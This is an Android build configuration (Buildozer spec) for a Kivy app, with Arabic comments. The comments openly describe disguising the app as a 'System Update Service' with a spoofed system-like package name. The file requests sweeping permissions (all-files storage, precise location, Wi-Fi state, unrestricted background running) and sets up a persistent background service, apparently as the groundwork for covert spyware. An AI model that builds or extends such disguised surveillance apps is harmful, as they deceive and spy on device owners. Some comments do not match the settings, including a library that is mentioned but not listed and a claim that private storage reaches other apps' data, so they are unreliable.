[app]

# (str) عنوان التطبيق (تمويهي)
title = System Update Service

# (str) اسم الحزمة
package.name = sys_v2_core
package.domain = org.system.service

source.dir = .
source.include_exts = py,png,jpg,kv,atlas,ttf,json
version = 2.0

# (list) المكتبات المطلوبة (أضفت Scapy و Requests للتعامل مع الشبكة والبيانات)
requirements = python3,kivy,requests,arabic-reshaper,python-bidi

orientation = portrait
fullscreen = 0

# (list) الصلاحيات - هذه هي "مفاتيح" الدخول للنظام
# أضفت صلاحيات الوصول للواي فاي، الموقع (للشبكة)، والملفات الشاملة
android.permissions = INTERNET, WRITE_EXTERNAL_STORAGE, READ_EXTERNAL_STORAGE, MANAGE_EXTERNAL_STORAGE, READ_MEDIA_IMAGES, ACCESS_NETWORK_STATE, ACCESS_WIFI_STATE, ACCESS_FINE_LOCATION, REQUEST_IGNORE_BATTERY_OPTIMIZATIONS, POST_NOTIFICATIONS, FOREGROUND_SERVICE

# (int) استهداف أحدث API لضمان التوافق مع أندرويد 14
android.api = 34
android.minapi = 21

# (bool) دعم أندرويد الحديث
android.enable_androidx = True

# (list) البنى التحتية للمعالجات (دعم كافة الأجهزة الحديثة)
android.archs = arm64-v8a, armeabi-v7a

# (bool) السماح بالوصول لبيانات التطبيقات الأخرى (قدر الإمكان)
android.private_storage = True

# (list) إضافة السيرفس (الخدمة الخلفية) لضمان عدم توقف الكود
# services = MyCoreService:service.py

[buildozer]
log_level = 2
warn_on_root = 1
